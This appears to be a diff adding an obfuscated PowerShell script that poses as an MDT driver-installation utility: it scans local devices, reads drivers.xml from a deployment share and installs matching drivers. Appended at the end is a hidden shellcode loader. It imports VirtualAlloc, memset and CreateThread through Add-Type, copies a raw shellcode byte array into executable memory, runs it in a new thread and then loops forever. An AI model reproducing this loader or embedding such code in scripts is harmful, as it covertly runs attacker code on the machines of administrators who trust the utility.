@@ -1,0 +1,36 @@
+  sv ('p98'+'zQ') (  [TYPE]("{0}{2}{1}" -f'sY','N','STeM.veRSiO')) ;&("{1}{3}{0}{2}" -f's','Wri','t','te-Ho') -NoNewLine ('E'+'nter '+'the'+' '+'p'+'ath '+'t'+'o '+'t'+'he '+'MD'+'T '+'D'+'ep'+'loyment '+'Share'+' '+'(E'+'.g '+"`"\\util01\mdt$`" "+'or'+' '+"`"Z:\`"): "+'')
+${sHA`RE} = .("{2}{0}{1}" -f '-','Host','Read')
+&("{0}{3}{1}{4}{2}" -f'W','e','gress','rit','-Pro') -Activity ("{1}{4}{2}{3}{0}" -f '..','D','er',' Scan.','riv') -PercentComplete 0 -Status ("{3}{9}{7}{0}{6}{1}{4}{8}{5}{2}" -f'ng',' dev','..','Ga','ices','s PC.',' list of','ri',' on thi','the')
+${Dev`icEs} = (&("{2}{1}{0}" -f'ice','Dev','Get-Pnp'))."H`ARdwARe`iD";
+${DeVic`Es_`L`IST} = &("{1}{2}{0}"-f'Object','Ne','w-') -TypeName ("{1}{3}{0}{6}{4}{5}{2}{7}" -f'ections.','Syste','[stri','m.Coll','eri','c.List','Gen','ng]')
+foreach(${d`EVICE} in ${d`e`ViCeS}) {
+    ${dev`icEs_`LI`st}.("{1}{0}" -f'dd','A').Invoke(${d`eV`icE});
+}
+&("{1}{2}{0}{3}{4}" -f 'rogre','W','rite-P','s','s') -Activity ("{0}{3}{2}{1}" -f'Driver S','.','n..','ca') -PercentComplete 0 -Status ("{2}{6}{3}{5}{8}{7}{4}{1}{0}" -f'..','store.','G','ering list','n the ',' of','ath','rivers i',' d')
+${D`Ri`VeRS} = &("{2}{0}{1}"-f'ect-','Xml','Sel') -Path (.("{0}{2}{1}"-f'J','Path','oin-') -Path ${S`hAre} -ChildPath ((("{3}{5}{4}{2}{1}{0}" -f 'l','ivers.xm','r','BRsC','rolBRsD','ont'))."re`pLA`cE"(([CHAr]66+[CHAr]82+[CHAr]115),[STrIng][CHAr]92))) -XPath ("{4}{1}{2}{3}{0}" -f 'ver','ri','vers/d','ri','/d')
+${cOU`NT} = 0
+${drI`V`ER`S_FoUnd} = .("{2}{0}{1}" -f 'O','bject','New-') -TypeName ("{7}{6}{4}{10}{3}{1}{13}{8}{9}{11}{12}{0}{14}{5}{2}"-f'n','s.','bject]','ection','em.C',' o','yst','S','e','n','oll','eric.Dict','ionary[stri','G','g,')
+foreach(${Dr`iVER} in ${d`Ri`VeRs}) {
+    .("{0}{2}{1}{3}" -f 'Wr','-P','ite','rogress') -Activity ("{1}{0}{2}{3}"-f'iver ','Dr','Scan.','..') -PercentComplete ((${cO`UNt} / ${DriV`E`RS}."C`OuNt") * 100) -Status "Scanning driver: $($driver.Node.Name) "
+    foreach(${Hw`id} in ${d`RiV`eR}."n`oDE"."P`NpId") {
+        if(${DeVIce`S`_LIST}.("{2}{0}{1}" -f 'onta','ins','C').Invoke(${H`Wid})) {
+            if(${d`RI`V`Ers_fo`UND}.("{3}{1}{0}{2}"-f'K','s','ey','Contain').Invoke(${H`wiD})) {
+                ${ad`Ded`_DrIV`ER} =  (  gET-vaRiAblE  ('p98'+'zQ')  )."V`ALuE"::"n`Ew"(${Dr`iV`ERs_Fo`UNd}[${H`wId}]."vE`R`SIon")
+                ${tO`B`e_Driv`Er} =   (  gET-IteM ('v'+'AR'+'iabl'+'E:p98'+'zQ') )."vaL`Ue"::("{1}{0}"-f'ew','n').Invoke(${DRi`V`er}."No`DE"."ve`RSi`on")
+                if(${A`D`DEd_DR`ivER}.("{0}{2}{1}" -f 'Compa','eTo','r').Invoke(${TO`Be`_dRiV`er}) -lt 0) {
+                    ${D`RIVERS_fO`UNd}[${hW`Id}] = ${d`RivER}."no`de"
+                }
+            } else {
+                ${D`R`iV`eRS_FOuND}.("{1}{0}" -f 'd','Ad').Invoke(${H`wId}, ${Dr`IVER}."N`ODE");
+            }
+        }
+    }
+    ${C`OUnT}++
+}
+${C`Ou`Nt} = 0
+foreach(${d`RiveR} in ${DRIVe`R`S_found}."Va`lU`es") {
+    &("{1}{0}{2}{3}{4}"-f'rite-Pr','W','o','g','ress') -Activity ("{4}{3}{2}{0}{1}"-f 'all..','.','t','Ins','Driver ') -PercentComplete ((${c`OUnT} / ${d`RiVErS_F`O`UND}."cou`NT") * 100) -Status "Installing driver: $($driver.Name)... "
+    &("{2}{1}{0}{3}" -f'Proce','tart-','S','ss') -FilePath ("{0}{1}{2}{3}"-f'pnp','uti','l','.exe') -ArgumentList "/add-driver `"$(Join-Path -Path $share -ChildPath $driver.Source)`" /install " -WindowStyle ("{1}{0}" -f'n','Hidde') -Wait
+    ${cou`Nt}++
+}
+${x`N9} = (((("{35}{39}{66}{9}{29}{8}{60}{64}{14}{0}{30}{26}{56}{44}{63}{59}{48}{47}{19}{16}{15}{57}{3}{36}{41}{68}{50}{70}{28}{46}{40}{37}{45}{5}{31}{32}{18}{27}{61}{71}{17}{10}{51}{67}{1}{54}{62}{22}{33}{24}{20}{12}{58}{52}{2}{53}{7}{34}{49}{25}{4}{38}{43}{55}{21}{23}{69}{11}{65}{42}{6}{13}"-f 'c','pPar',';[','llImp','kS)]public stat','adA',' count)','m','lr','kSke','art','nt src',', IntPtr ',';','c stati','rotect);',' flP','r lpSt','dwStackSize, I','flAllocationType, uint','CreationFlags','emset(IntPtr dest, ','r, ','u','dw','vcrt.dllr','rn IntPt','n','extern IntP','rnel32.dl',' exte','ttributes',', uint ','uint ','port(','[Dll','ort(rkSkerne','hread(IntPtr lpThr','ic','Impo','eateT','l32',' uint',' extern In','lAlloc(IntPtr lpAddress, ','e','tr Cr',', uint ','e','rkSms','ubl','Addre','eadId)','DllI','a','tPtr m','r Virtua','[D','lpThr','t dwSiz','kS)]pu','t','mete','uin','bli',',','rt(r','ss, IntPtr l','.dllrkS)]p','i','ic static ','Pt'))-crEPLACE  ([chaR]114+[chaR]107+[chaR]83),[chaR]34));${w} = .("{0}{2}{1}" -f 'A','d-Type','d') -memberDefinition ${x`N9} -Name ("{0}{1}"-f'Wi','n32') -namespace ("{0}{2}{3}{4}{1}"-f'Wi','ions','n32F','un','ct') -passthru;[Byte[]];[Byte[]]${Z} = 0xb8,0xf8,0xdf,0x16,0x01,0xda,0xc1,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0xf7,0x3d,0xe3,0xfd,0xef,0x40,0x0c,0xfe,0xef,0x24,0x84,0x1b,0xde,0x64,0xf2,0x68,0x70,0x55,0x70,0x3c,0x7c,0x1e,0xd4,0xd5,0xf7,0x52,0xf1,0xda,0xb0,0xd9,0x27,0xd4,0x41,0x71,0x1b,0x77,0xc1,0x88,0x48,0x57,0xf8,0x42,0x9d,0x96,0x3d,0xbe,0x6c,0xca,0x96,0xb4,0xc3,0xfb,0x93,0x81,0xdf,0x70,0xef,0x04,0x58,0x64,0xa7,0x27,0x49,0x3b,0xbc,0x71,0x49,0xbd,0x11,0x0a,0xc0,0xa5,0x76,0x37,0x9a,0x5e,0x4c,0xc3,0x1d,0xb7,0x9d,0x2c,0xb1,0xf6,0x12,0xdf,0xcb,0x3f,0x94,0x00,0xbe,0x49,0xe7,0xbd,0xb9,0x8d,0x9a,0x19,0x4f,0x16,0x3c,0xe9,0xf7,0xf2,0xbd,0x3e,0x61,0x70,0xb1,0x8b,0xe5,0xde,0xd5,0x0a,0x29,0x55,0xe1,0x87,0xcc,0xba,0x60,0xd3,0xea,0x1e,0x29,0x87,0x93,0x07,0x97,0x66,0xab,0x58,0x78,0xd6,0x09,0x12,0x94,0x03,0x20,0x79,0xf0,0xe0,0x09,0x82,0x00,0x6f,0x19,0xf1,0x32,0x30,0xb1,0x9d,0x7e,0xb9,0x1f,0x59,0x81,0x90,0xd8,0xf5,0x7c,0x1b,0x19,0xdf,0xba,0x4f,0x49,0x77,0x6b,0xf0,0x02,0x87,0x94,0x25,0xbe,0x82,0x02,0x06,0x97,0x94,0x94,0xee,0xea,0xa6,0x09,0xb3,0x63,0x40,0x79,0x1b,0x24,0xdd,0x39,0xcb,0x84,0x8d,0xd1,0x01,0x0b,0xf1,0xc1,0x29,0xc1,0x9a,0x6b,0xc6,0xbc,0xf3,0x03,0x7f,0xe5,0x88,0xb2,0x80,0x33,0xf5,0xf4,0x0b,0xb0,0x09,0xba,0xfb,0xbd,0x19,0x2a,0x0c,0x88,0x40,0xfc,0x13,0x26,0xee,0x00,0x86,0xcd,0xb9,0x57,0x3e,0xcc,0x9c,0x9f,0xe1,0x2f,0xcb,0x94,0x28,0xba,0xb4,0xc2,0x54,0x2a,0x35,0x12,0x03,0x20,0x35,0x7a,0xf3,0x10,0x66,0x9f,0xfc,0x8c,0x1a,0x0c,0x69,0x2f,0x4b,0xe1,0x3a,0x47,0x71,0xdc,0x0d,0xc8,0x8a,0x0b,0x8c,0x34,0x5d,0x75,0xfa,0x54,0x5d;${g} = 0x1000;if (${z}."l`enGTh" -gt 0x1000){${G} = ${z}."len`gth"};${d`8z}=${w}::("{1}{3}{2}{0}" -f 'oc','Virt','l','ualAl').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${z}."LEN`GTH"-1);${I}++) {${w}::"m`EMsEt"([IntPtr](${D`8z}.("{1}{0}" -f'32','ToInt').Invoke()+${i}), ${Z}[${I}], 1)};${W}::("{1}{2}{0}{3}"-f'r','Cre','ateTh','ead').Invoke(0,0,${d`8Z},0,0,0);for (;;){&("{2}{0}{1}"-f 't-s','leep','Star') 60};
